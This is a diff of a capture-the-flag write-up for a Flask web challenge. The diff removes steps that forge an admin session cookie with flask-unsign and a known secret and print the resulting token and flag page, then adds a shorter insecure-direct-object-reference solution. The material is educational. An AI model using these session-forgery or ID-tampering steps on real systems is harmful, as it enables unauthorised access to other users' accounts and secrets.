@@ -16,8 +16,6 @@ http://secure_share.challenges.cybersecuritychallenge.be
 
 Here is the code of the server:
 
-It's a whitebox challenge, here is the source code of the application:
-
 ```py
 from flask import Flask, request, render_template, redirect, url_for, session, abort, flash
 from functools import wraps
@@ -201,85 +199,10 @@ We can see that the admin is the user 3 and his API key is stored in the environ
 
 We can try to access the `/directory/3` page to get the admin's profile and his API key.
 
-```html
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Directory details - SecureShare</title>
-    <link rel="stylesheet" href="/static/styles.css">
-    
-</head>
-<body>
-    <header class="company-header">SecureShare Internal Directory</header>
-    <main>
-        <h1>Directory details</h1>
-        
-<section class="card">
-    <div class="profile-field">
-        <span class="profile-label">Employee ID:</span> admin
-    </div>
-    <div class="profile-field">
-        <span class="profile-label">Work Email:</span> admin@example.com
-    </div>
-    
-        
-    
-</section>
+We register ourselves and are now logged in. If we now go to http://secure_share.challenges.cybersecuritychallenge.be/profile?id=3 we get the flag:
 
-<a href="/directory" class="back-link">← Back to Directory</a>
+![](./Resources/secure.png)
 
-
-    </main>
-</body>
-</html>
-```
-
-We can see that the admin's profile is not displayed. We can try to access the admin's profile by changing the user ID in the URL. We can try to generate the admin cookie with the following script:
-
-```sh
-flask-unsign --sign --cookie "{'user_id': 3}" --secret "supersecretkey"
-```
-
-It gives us: `eyJ1c2VyX2lkIjozfQ.Z9P8gg.rtsTh1gwJ2eC4VMgth98M8tv-f8`
-
-```html
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Employee Profile - SecureShare</title>
-    <link rel="stylesheet" href="/static/styles.css">
-    
-</head>
-<body>
-    <header class="company-header">SecureShare Internal Directory</header>
-    <main>
-        <h1>My Employee Profile</h1>
-        
-<section class="card">
-    <div class="profile-field">
-        <span class="profile-label">Employee ID:</span> admin
-    </div>
-    <div class="profile-field">
-        <span class="profile-label">Work Email:</span> admin@example.com
-    </div>
-    
-    <div class="private-field">
-        <span class="profile-label">API Key:</span> CSC{ID0R_1s_N0t_S0_S3cur3_4ft3r_4ll}
-    </div>
-    
-</section>
-
-<a href="/" class="back-link">← Back to Home</a>
-
-
-    </main>
-</body>
-</html>
-```
 
 ## Solve script
 
